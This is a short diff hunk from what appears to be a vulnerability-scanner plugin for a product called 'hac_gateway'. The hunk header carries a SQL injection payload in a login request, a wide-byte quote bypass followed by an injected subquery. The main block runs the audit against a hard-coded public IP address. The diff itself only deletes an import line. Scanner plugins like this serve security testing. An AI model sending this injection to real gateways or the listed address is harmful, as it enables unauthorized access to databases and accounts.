@@ -34,5 +34,5 @@ password_check=1&account=aaa%cf'+and+exists(select*from+(select*from(select+name
         security_hole(target)
         
 if __name__ == '__main__': 
-    from dummy import *
+
     audit(assign('hac_gateway','https://123.124.158.72/')[1])
